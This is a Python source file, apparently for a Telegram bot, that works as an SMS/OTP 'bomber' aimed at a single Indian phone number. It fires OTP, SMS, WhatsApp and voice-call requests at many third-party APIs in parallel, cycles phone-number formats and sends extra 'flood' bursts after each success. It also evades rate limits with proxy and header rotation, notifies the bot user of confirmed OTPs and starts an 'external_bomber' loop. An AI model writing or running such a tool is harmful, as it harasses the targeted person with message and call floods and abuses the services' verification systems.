from __future__ import annotations

import asyncio
import copy
import time
import random
from typing import Dict, List, Optional, Callable

import aiohttp
from aiohttp import TCPConnector
from aiohttp_socks import ProxyConnector

from helpers import replacePlaceholders, injectRotatedHeaders


# ---------------------------------------------------------------------------
# OTP + Call success detection
# ---------------------------------------------------------------------------

OTP_KEYWORDS = [
    "otp sent", "otp has been sent", "verification code sent",
    "sent successfully", "sms sent", "message sent",
    "\"success\":true", "\"status\":\"success\"", "\"status\":\"ok\"",
    "\"result\":true", "successfully sent", "send otp", "otp generated",
    "message delivered", "sms delivered", "code sent", "verification sent",
    "call initiated", "call placed", "calling", "voice call",
    "whatsapp", "wp otp", "sent to whatsapp",
]

CALL_KEYWORDS = [
    "call initiated", "call placed", "calling", "voice call",
    "ivr", "phone call", "ring",
]

def isConfirmedOtp(status: int, text: str) -> bool:
    if status not in (200, 201, 202):
        return False
    t = text.lower()
    return any(k in t for k in OTP_KEYWORDS)

def isCallTriggered(status: int, text: str) -> bool:
    if status not in (200, 201, 202):
        return False
    t = text.lower()
    return any(k in t for k in CALL_KEYWORDS)

def is2xx(status: int) -> bool:
    return 200 <= status < 300


# ---------------------------------------------------------------------------
# Phone number format variants — hit every possible format per API
# ---------------------------------------------------------------------------

def getPhoneVariants(phone: str) -> List[str]:
    """Return all common Indian phone number formats."""
    return [
        phone,           # 9876543210
        f"91{phone}",    # 919876543210
        f"+91{phone}",   # +919876543210
        f"0{phone}",     # 09876543210
    ]


# ---------------------------------------------------------------------------
# Per-API state with adaptive concurrency
# ---------------------------------------------------------------------------

class ApiState:
    ACTIVE      = "active"
    RATELIMITED = "ratelimited"
    DEAD        = "dead"

    RL_BASE     = 45.0
    RL_MAX      = 300.0
    DEAD_STREAK = 5

    # Adaptive concurrency bounds
    MIN_CONCURRENCY = 2
    MAX_CONCURRENCY = 32

    def __init__(self, name: str, baseConcurrency: int):
        self.name              = name
        self.status            = self.ACTIVE
        self.cooldownUntil     = 0.0
        self.errorStreak       = 0
        self.rlCount           = 0
        self.requests          = 0
        self.confirmed         = 0
        self.responses2xx      = 0
        self.rateLimits        = 0
        self.errors            = 0
        self.totalLatencyMs    = 0.0
        self.latencyCount      = 0
        # Adaptive concurrency
        self.concurrency       = baseConcurrency
        self._successWindow    = 0   # recent successes
        self._errorWindow      = 0   # recent errors
        self._windowSize       = 20  # evaluate every N requests

    def isAvailable(self) -> bool:
        if self.status == self.DEAD:
            return False
        if self.status == self.RATELIMITED:
            if time.time() >= self.cooldownUntil:
                self.status = self.ACTIVE
                return True
            return False
        return True

    def cooldownDuration(self) -> float:
        return min(self.RL_BASE * (2 ** self.rlCount), self.RL_MAX)

    def recordLatency(self, latencySeconds: float) -> None:
        self.totalLatencyMs += latencySeconds * 1000
        self.latencyCount   += 1

    def avgMs(self) -> int:
        if self.latencyCount == 0:
            return 0
        return int(self.totalLatencyMs / self.latencyCount)

    def adaptConcurrency(self, success: bool) -> None:
        """Increase concurrency for fast/successful APIs, decrease for slow/erroring ones."""
        if success:
            self._successWindow += 1
        else:
            self._errorWindow += 1

        total = self._successWindow + self._errorWindow
        if total < self._windowSize:
            return

        successRate = self._successWindow / total
        if successRate >= 0.7:
            # Performing well — ramp up
            self.concurrency = min(self.concurrency + 2, self.MAX_CONCURRENCY)
        elif successRate <= 0.3:
            # Struggling — back off
            self.concurrency = max(self.concurrency - 1, self.MIN_CONCURRENCY)

        # Reset window
        self._successWindow = 0
        self._errorWindow   = 0


# ---------------------------------------------------------------------------
# Stats — lock-free atomic counters for speed
# ---------------------------------------------------------------------------

class Stats:
    def __init__(self, apiNames: List[str], baseConcurrency: int) -> None:
        self.startTime  = time.time()
        # Use simple ints — no lock, GIL protects these in CPython
        self.totalReqs  = 0
        self.confirmed  = 0
        self.responses  = 0
        self.errors     = 0
        self.calls      = 0
        self.lastOtpApi = ""
        self.apiStates: Dict[str, ApiState] = {
            n: ApiState(n, baseConcurrency) for n in apiNames
        }
        # Callback for OTP notification
        self.onOtpConfirmed: Optional[Callable] = None

    def elapsed(self) -> float:
        return time.time() - self.startTime

    def rps(self) -> float:
        e = self.elapsed()
        return round(self.totalReqs / e, 1) if e > 0 else 0.0

    def recordSuccess(self, name: str, latency: float, confirmed: bool, isCall: bool = False) -> None:
        self.totalReqs += 1
        self.responses += 1
        s = self.apiStates.get(name)
        if s:
            s.requests     += 1
            s.responses2xx += 1
            s.errorStreak   = 0
            s.recordLatency(latency)
            s.adaptConcurrency(True)
            if confirmed:
                s.confirmed    += 1
                self.confirmed += 1
                self.lastOtpApi = name
                if self.onOtpConfirmed:
                    asyncio.create_task(self.onOtpConfirmed(name))
            if isCall:
                self.calls += 1

    def recordRateLimit(self, name: str) -> None:
        self.totalReqs += 1
        s = self.apiStates.get(name)
        if s:
            s.requests   += 1
            s.rateLimits += 1
            s.rlCount    += 1
            cooldown = s.cooldownDuration()
            s.cooldownUntil = time.time() + cooldown
            s.status        = ApiState.RATELIMITED

    def recordError(self, name: str) -> None:
        self.totalReqs += 1
        self.errors    += 1
        s = self.apiStates.get(name)
        if s:
            s.requests    += 1
            s.errors      += 1
            s.errorStreak += 1
            s.adaptConcurrency(False)
            if s.errorStreak >= ApiState.DEAD_STREAK:
                s.status = ApiState.DEAD

    def snapshot(self) -> dict:
        perApi = {}
        for name, s in self.apiStates.items():
            perApi[name] = {
                "requests":     s.requests,
                "confirmed":    s.confirmed,
                "responses":    s.responses2xx,
                "errors":       s.errors,
                "ratelimits":   s.rateLimits,
                "avgMs":        s.avgMs(),
                "status":       s.status,
                "concurrency":  s.concurrency,
            }
        return {
            "totalReqs": self.totalReqs,
            "confirmed": self.confirmed,
            "responses": self.responses,
            "errors":    self.errors,
            "calls":     self.calls,
            "elapsed":   round(self.elapsed(), 1),
            "rps":       self.rps(),
            "perApi":    perApi,
            "total":     self.totalReqs,
            "otpSent":   self.confirmed,
        }


# ---------------------------------------------------------------------------
# Type coercion
# ---------------------------------------------------------------------------

def coerceTypes(obj, original):
    if isinstance(original, dict) and isinstance(obj, dict):
        return {k: coerceTypes(obj.get(k, v), v) for k, v in original.items()}
    if isinstance(original, list) and isinstance(obj, list):
        return [coerceTypes(o, p) for o, p in zip(obj, original)]
    if isinstance(original, int) and isinstance(obj, str):
        try: return int(obj)
        except (ValueError, TypeError): return obj
    if isinstance(original, float) and isinstance(obj, str):
        try: return float(obj)
        except (ValueError, TypeError): return obj
    return obj


# ---------------------------------------------------------------------------
# Shared keep-alive connector pool — one per proxy config
# ---------------------------------------------------------------------------

_connectorPool: Dict[str, TCPConnector] = {}

def getConnector(proxy: Optional[str]) -> aiohttp.BaseConnector:
    if proxy:
        # Proxy connectors can't be shared — create fresh
        return ProxyConnector.from_url(
            proxy,
            limit=100,
            ssl=False,
            enable_cleanup_closed=True,
        )
    key = "default"
    if key not in _connectorPool or _connectorPool[key].closed:
        _connectorPool[key] = TCPConnector(
            limit=0,              # unlimited total
            limit_per_host=50,    # max 50 per host
            ttl_dns_cache=600,    # cache DNS 10 min
            ssl=False,
            keepalive_timeout=30,
            force_close=False,
            enable_cleanup_closed=True,
        )
    return _connectorPool[key]


# ---------------------------------------------------------------------------
# Single API call — with phone variants + flood mode + retry
# ---------------------------------------------------------------------------

async def callApi(
    session: aiohttp.ClientSession,
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    retry: bool = True,
    phoneVariant: Optional[str] = None,
) -> bool:
    """Returns True if successful (2xx)."""
    name = api["name"]
    if stopEvent.is_set():
        return False

    targetPhone = phoneVariant or phone

    try:
        cfg        = copy.deepcopy(api)
        rawHeaders = cfg.get("headers") or {}
        headers    = injectRotatedHeaders(replacePlaceholders(rawHeaders, targetPhone))
        params     = replacePlaceholders(cfg.get("params"), targetPhone)
        jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), targetPhone), api.get("json"))
        data       = replacePlaceholders(cfg.get("data"), targetPhone)
        cookies    = replacePlaceholders(cfg.get("cookies"), targetPhone)
        url        = cfg["url"].replace("{phone}", targetPhone)

        t0 = time.time()
        async with session.request(
            cfg["method"], url,
            headers=headers, params=params,
            json=jsonData, data=data, cookies=cookies,
            timeout=aiohttp.ClientTimeout(total=6, connect=2),
            allow_redirects=True,
            ssl=False,
        ) as resp:
            latency = time.time() - t0
            text    = await resp.text()

            if resp.status == 429:
                stats.recordRateLimit(name)
                return False

            if is2xx(resp.status):
                confirmed = isConfirmedOtp(resp.status, text)
                isCall    = isCallTriggered(resp.status, text)
                stats.recordSuccess(name, latency, confirmed, isCall)
                return True

            stats.recordError(name)
            if retry and not stopEvent.is_set():
                await callApi(session, api, phone, stats, stopEvent, retry=False, phoneVariant=phoneVariant)
            return False

    except asyncio.TimeoutError:
        stats.recordError(name)
        return False
    except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
            aiohttp.ClientOSError, aiohttp.ClientResponseError):
        stats.recordError(name)
        return False
    except Exception:
        stats.recordError(name)
        return False


# ---------------------------------------------------------------------------
# Per-API worker — adaptive concurrency + flood mode + phone variants
# ---------------------------------------------------------------------------

async def apiWorker(
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    proxy: Optional[str],
    baseConcurrency: int,
    floodOnSuccess: bool = True,
) -> None:
    """
    One dedicated worker per API.
    - Maintains adaptive concurrency (auto-scales based on success rate)
    - Flood mode: when an API hits, fires a burst of extra requests immediately
    - Cycles through phone number format variants
    - Uses keep-alive connection pool for speed
    """
    connector = getConnector(proxy)
    ownConnector = proxy is not None  # only close proxy connectors, not the shared pool

    # Use connector_owner=False for shared pool so it stays alive
    session = aiohttp.ClientSession(
        connector=connector,
        connector_owner=ownConnector,
    )

    try:
        activeTasks: set = set()
        phoneVariants    = getPhoneVariants(phone)
        variantIdx       = 0
        floodBudget      = 0   # extra requests to fire on success

        while not stopEvent.is_set():
            state = stats.apiStates.get(api["name"])
            if not state:
                break

            if state.status == ApiState.DEAD:
                break

            if state.status == ApiState.RATELIMITED:
                remaining = state.cooldownUntil - time.time()
                if remaining > 0:
                    chunk = min(remaining, 2.0)
                    try:
                        await asyncio.wait_for(asyncio.shield(stopEvent.wait()), timeout=chunk)
                        break
                    except asyncio.TimeoutError:
                        pass
                    continue

            # Clean finished tasks
            done    = {t for t in activeTasks if t.done()}
            activeTasks -= done

            # Check results of done tasks for flood triggering
            for t in done:
                try:
                    if t.result():  # returned True = success
                        floodBudget += 3  # fire 3 extra requests on each success
                except Exception:
                    pass

            # Current target concurrency (adaptive)
            targetConcurrency = state.concurrency

            # Fire flood burst if we have budget
            if floodBudget > 0 and len(activeTasks) < targetConcurrency + 10:
                variant = phoneVariants[variantIdx % len(phoneVariants)]
                variantIdx += 1
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent, phoneVariant=variant)
                )
                activeTasks.add(task)
                floodBudget -= 1
                continue

            # Normal fill up to concurrency
            if len(activeTasks) < targetConcurrency:
                variant = phoneVariants[variantIdx % len(phoneVariants)]
                variantIdx += 1
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent, phoneVariant=variant)
                )
                activeTasks.add(task)
            else:
                # Yield to event loop
                await asyncio.sleep(0)

        # Cleanup
        for t in activeTasks:
            t.cancel()
        if activeTasks:
            await asyncio.gather(*activeTasks, return_exceptions=True)

    finally:
        await session.close()


# ---------------------------------------------------------------------------
# Single API test (admin tester)
# ---------------------------------------------------------------------------

async def testSingleApi(api: dict, phone: str) -> dict:
    try:
        cfg        = copy.deepcopy(api)
        rawHeaders = cfg.get("headers") or {}
        headers    = injectRotatedHeaders(replacePlaceholders(rawHeaders, phone))
        params     = replacePlaceholders(cfg.get("params"), phone)
        jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), phone), api.get("json"))
        data       = replacePlaceholders(cfg.get("data"), phone)
        cookies    = replacePlaceholders(cfg.get("cookies"), phone)
        url        = cfg["url"].replace("{phone}", phone)

        connector = TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.time()
            async with session.request(
                cfg["method"], url,
                headers=headers, params=params,
                json=jsonData, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True,
            ) as resp:
                latency = round((time.time() - t0) * 1000)
                text    = await resp.text()
                return {
                    "ok":        True,
                    "status":    resp.status,
                    "latencyMs": latency,
                    "snippet":   text[:300].strip(),
                }
    except asyncio.TimeoutError:
        return {"ok": False, "error": "Timeout (>15s)"}
    except aiohttp.ClientConnectorError as e:
        return {"ok": False, "error": f"Connection failed: {str(e)[:60]}"}
    except Exception as e:
        return {"ok": False, "error": (str(e).strip() or type(e).__name__)[:80]}


# ---------------------------------------------------------------------------
# Proxy helpers
# ---------------------------------------------------------------------------

async def checkProxy(proxy: str) -> Optional[str]:
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                "http://httpbin.org/ip",
                timeout=aiohttp.ClientTimeout(total=5)
            ):
                return proxy
    except Exception:
        return None


async def validateProxies(proxyList: List[str]) -> List[str]:
    results = await asyncio.gather(*[checkProxy(p) for p in proxyList])
    return [p for p in results if p]


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

class TesterRunner:
    def __init__(
        self,
        phone: str,
        duration: int,
        workers: int,
        useProxy: bool,
        proxyList: Optional[List[str]] = None,
        userId: Optional[int] = None,
        bot=None,
    ) -> None:
        self.phone      = phone
        self.duration   = duration
        self.workers    = workers
        self.useProxy   = useProxy
        self._proxyList = proxyList or []
        self._userId    = userId
        self._bot       = bot

        from bot.services.api_manager import apiManager
        from bot.services.database import db
        self._apiConfigs = apiManager.getMergedConfigs()
        self._skipSet    = db.getSkippedApiNames()

        self.stats      = Stats([a["name"] for a in self._apiConfigs], workers)
        self._stopEvent = asyncio.Event()
        self._tasks: List[asyncio.Task] = []
        self._running   = False
        self._endTime   = 0.0
        self._lastOtpNotifTime = 0.0

    @property
    def isRunning(self) -> bool:
        return self._running

    async def _otpNotify(self, apiName: str) -> None:
        if not self._bot or not self._userId:
            return
        now = time.time()
        if now - self._lastOtpNotifTime < 5.0:
            return
        self._lastOtpNotifTime = now
        try:
            total = self.stats.confirmed
            calls = self.stats.calls
            callStr = f"\nCalls     <code>{calls}</code>" if calls > 0 else ""
            await self._bot.send_message(
                self._userId,
                f"<b>OTP Confirmed!</b>\n\n"
                f"Phone     <code>{self.phone}</code>\n"
                f"API       <code>{apiName}</code>\n"
                f"Total     <code>{total}</code> confirmed{callStr}",
                parse_mode="HTML"
            )
        except Exception:
            pass

    async def start(self) -> None:
        self._running  = True
        self._endTime  = time.time() + self.duration
        self._stopEvent.clear()
        self.stats     = Stats([a["name"] for a in self._apiConfigs], self.workers)
        self.stats.onOtpConfirmed = self._otpNotify

        proxyList: List[str] = []
        if self.useProxy and self._proxyList:
            proxyList = await validateProxies(self._proxyList)

        activeApis = [a for a in self._apiConfigs if a["name"] not in self._skipSet]

        # One dedicated worker per API — all fire simultaneously
        for idx, api in enumerate(activeApis):
            proxy = proxyList[idx % len(proxyList)] if proxyList else None
            task  = asyncio.create_task(
                apiWorker(
                    api=api,
                    phone=self.phone,
                    stats=self.stats,
                    stopEvent=self._stopEvent,
                    proxy=proxy,
                    baseConcurrency=self.workers,
                ),
                name=f"api_{api['name']}"
            )
            self._tasks.append(task)

        timer    = asyncio.create_task(self._timer(),    name="timer")
        watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
        self._tasks.extend([timer, watchdog])

        # Fire external bomber alongside main test — silently skips if down
        try:
            from external_bomber import externalBomberLoop
            extTask = asyncio.create_task(
                externalBomberLoop(self.phone, self._stopEvent),
                name="external_bomber"
            )
            self._tasks.append(extTask)
        except Exception:
            pass

    async def stop(self) -> None:
        self._stopEvent.set()
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self._running = False

    async def _timer(self) -> None:
        delay = self._endTime - time.time()
        if delay > 0:
            await asyncio.sleep(delay)
        self._stopEvent.set()

    async def _watchdog(self) -> None:
        apiTasks = [t for t in self._tasks if t.get_name().startswith("api_")]
        if apiTasks:
            await asyncio.gather(*apiTasks, return_exceptions=True)
        self._running = False